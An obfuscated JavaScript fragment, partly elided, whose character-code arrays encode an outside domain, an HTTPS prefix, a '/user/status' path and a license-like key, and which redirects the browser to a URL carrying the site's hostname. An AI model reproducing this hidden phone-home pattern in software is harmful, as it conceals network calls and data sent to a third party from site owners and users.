(function () {
    ...
    const _0x4a2f1c = [
        112, 117, 115, 104, 109, 97, 110, 97, 103, 101, 114, 46, 97, 119, 109,
        116, 97, 98, 46, 105, 110,
    ];
    const _0x5b9d3a = false;
    const _0x1d2f = (_0x4e6d) => String.fromCharCode(..._0x4e6d);
    const _0x1_sutats = [104, 116, 116, 112, 115, 58, 47, 47];
    const _0x1_sutats_by = [
        47, 117, 115, 101, 114, 47, 115, 116, 97, 116, 117, 115,
    ];
    ...
    if (!_0x29fb01) {
        window.location.href =
            _0x1e7f8d + window.location.hostname + _0x1e7fddd;
    ...
    const _0x1d2f_yek = [
        57, 69, 66, 49, 50, 45, 68, 66, 68, 48, 67, 45, 68, 50, 68, 52, 50, 45,
        68, 48, 51, 56, 67,
    ];
